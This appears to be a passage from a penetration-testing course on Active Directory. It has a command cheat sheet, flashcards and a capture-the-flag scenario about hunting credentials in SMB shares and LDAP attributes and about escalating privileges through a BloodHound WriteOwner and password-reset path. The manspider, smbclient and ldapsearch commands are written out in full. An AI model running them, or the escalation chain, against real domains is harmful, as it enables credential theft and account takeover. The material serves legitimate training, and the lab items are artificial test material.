Goal Command Inventory shares netexec smb <host> -u <user> -p '<pw>' -d <domain> --shares Filename match smbclient //<host>/<share> -U "..." -c "cd <dir>; ls *<token>*" Content scan at scale manspider <host> -u <user> -p '<pw>' -d <domain> --content "password\\s*[:=]\|cpassword" -e txt,ini,xml,csv,docx,xlsx,config Read extensionAttribute1 ldapsearch -x -LLL -H ldap://<dc> -D "<DOMAIN>\<user>" -w '<pw>' -b "<DN>" "(sAMAccountName=<target>)" extensionAttribute1

docs.title: Spaced Repetition
docs.text:
Card 1: manspider Credential Hunt

Q: One command to scan every share on corp-dc01.corp.local for files containing the substring password= or cpassword, restricted to text-like extensions, as j.smith / Pass#.

Answer 
manspider corp-dc01.corp.local -u j.smith -p 'Pass#' -d corp.local \
  --content "password=|cpassword" -e txt,ini,xml,config,csv

Add patterns with |. Add file extensions with -e. The output prints every hit with the file path and the matching line.

Card 2: extensionAttribute Read via LDAP

Q: Write the ldapsearch command that reads extensionAttribute1 from the user t.archer on corp.local at 10.10.10.10, authenticating as the same user with password Pass#.

Answer 
ldapsearch -x -LLL -H ldap://10.10.10.10 \
  -D "CORP\t.archer" -w 'Pass#' \
  -b "DC=corp,DC=local" \
  "(sAMAccountName=t.archer)" extensionAttribute1

Any authenticated user can usually read these attributes on any user (default ACL grants Authenticated Users read).

Card 3: smbclient One-Shot Read

Q: Write the smbclient command to print the contents of \\corp-dc01\IT-Tools\helpdesk-archive\vpn_handoff.txt to stdout in one invocation, using j.smith / Pass#.

Answer 
smbclient //corp-dc01/IT-Tools -U "CORP\j.smith%Pass#" \
  -c "cd helpdesk-archive; get vpn_handoff.txt -" \
  | cat

The - filename to get means "stdout". Pipe to cat (or omit it; smbclient writes directly).

Card 4: Why Helpdesk Shares Leak

Q: Name three reasons helpdesk staff write credentials to shares despite ticketing systems and password managers being available.

Answer
  1. Speed: a one-line text file is faster than logging into the password vault and naming a new entry. 2. Coordination: a shared file is visible to the whole team without permissions juggling. 3. Continuity: notes survive across shifts and outlast chat history. The defender's job is to make the password vault and wiki fast enough that helpdesk staff actually prefer them.

docs.title: Before You Begin
docs.text:
BloodHound finds the path. You execute the plan. Those are different skills. The collector finds an edge labeled WriteOwner between an IT helpdesk group and a privileged user; the human turns that edge into the right command (Set-DomainObjectOwner, then Add-DomainObjectAcl, then Set-DomainUserPassword) at the right moment. Many junior consultants miss the second step. They paste a screenshot of the BloodHound graph into a report, leave the execution as "exercise for the reader," and the deliverable feels theoretical.

Exercise 2.4 asks you to walk one short path edge by edge and write the execution plan a senior consultant would expect to see.

Tools required: bloodhound-python, BloodHound CE, plus the standard AD tooling (netexec, bloodyAD, net rpc, PowerView). Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "BloodHound gives you the route. The route is not the attack. Walk through the path and tell me, edge by edge, what you would do. I do not want a screenshot of the graph. I want a numbered plan I could hand to a junior consultant."

The seeded path is short and concrete:

j.chen --MemberOf--> IT_HelpDesk --WriteOwner--> m.tanaka --ForceChangePassword--> m.tanaka --MemberOf--> Server Operators

Submit a four-step numbered plan, one step per edge, naming the edge type and the exact tool/command you would use to traverse it. The scorer returns the flag when your edge identifications match the expected sequence.

Credentials:

Username Password j.chen Welcome2026#

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Collect the domain with BloodHound as j.chen
  • Identify the four-edge path from j.chen to Server Operators membership
  • Name each edge type
  • For each edge, write the command (or short script) you would execute to traverse it
  • Submit the plan to the scorer and recover the flag

docs.title: The Path You Will Walk
docs.text:
Each box below is a graph node; each arrow is an edge BloodHound surfaces and that you must traverse with a real command. Hold this picture in mind as you read the rest of the chapter.

flowchart LR
    JC["User: j.chen<br/>(your foothold)"]

    MT1["User: m.tanaka<br/>(after take-ownership)"]
    MT2["User: m.tanaka<br/>(after password reset)"]

    JC -->|MemberOf| HD
    HD -->|WriteOwner| MT1
